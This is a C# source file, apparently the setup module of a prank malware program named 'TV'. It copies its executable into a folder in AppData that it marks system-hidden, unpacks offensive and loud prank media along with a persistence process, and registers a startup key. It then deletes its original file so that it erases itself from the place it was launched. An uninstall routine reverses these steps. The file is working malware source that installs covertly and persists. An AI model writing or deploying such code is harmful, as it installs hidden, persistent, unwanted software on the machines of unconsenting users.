using System;
using System.IO;
using System.Diagnostics;

namespace TV
{
    public class TVSetup
    {
        public static void Install()
        {
            // Check if another instance is already installed
            if (Directory.Exists(Program.Appdata + @"\TV"))
            {
                // Melt
                TVMethods.Cmd("timeout /t 3 & del TV.exe");

                // Exit
                Environment.Exit(0);
            }

            // Create folder in appdata
            Directory.SetCurrentDirectory(Program.Appdata);
            Directory.CreateDirectory("TV");

            // Set folder to system hidden
            TVMethods.Cmd("attrib +S +H TV");

            // Copy file to folder
            File.Copy(Program.ExecutionPath + @"\TV.exe", Program.Appdata + @"\TV\TV.exe");

            // Set array with files names to extract
            string[] FileNameList = new string[] { "TVPers", "NyanCat", "Rickroll", "SmokeWeedEveryDay", "WindowsXPEarRape", "FuckYou", "SmokeWeed", "TrollFace" };

            // Extract files
            for (int i = 0; i < FileNameList.Length; i++)
            {
                TVMethods.Extract("TV", Program.Appdata + @"\TV", "Resources", FileNameList[i] + ".zip");
            }

            // Extract DLL
            TVMethods.Extract("TV", Program.Appdata + @"\TV", "Libs", "WMPLib.zip");

            // Convert files to bmp
            TVMethods.ConvertToBmp(Program.Appdata + @"\TV\FuckYou.jpg");
            TVMethods.ConvertToBmp(Program.Appdata + @"\TV\SmokeWeed.png");
            TVMethods.ConvertToBmp(Program.Appdata + @"\TV\TrollFace.jpg");

            // Start file
            Directory.SetCurrentDirectory(Program.Appdata + @"\TV");
            Process.Start(Program.Appdata + @"\TV\TV.exe");

            // Add startup key
            TVMethods.StartupKey("Add");

            // Goto initial execution path
            Directory.SetCurrentDirectory(Program.ExecutionPath);

            // Melt
            TVMethods.Cmd("timeout /t 3 & del TV.exe");
        }

        public static void Uninstall()
        {
            // Kill the persistence proccess
            foreach (var process in Process.GetProcessesByName("TVPers"))
            {
                process.Kill();
            }

            // Remove startup key
            TVMethods.StartupKey("Remove");

            // Remove folder
            Directory.SetCurrentDirectory(Program.Appdata);
            TVMethods.Cmd("timeout /t 3 & rd /s /q TV");
        }
    }
}
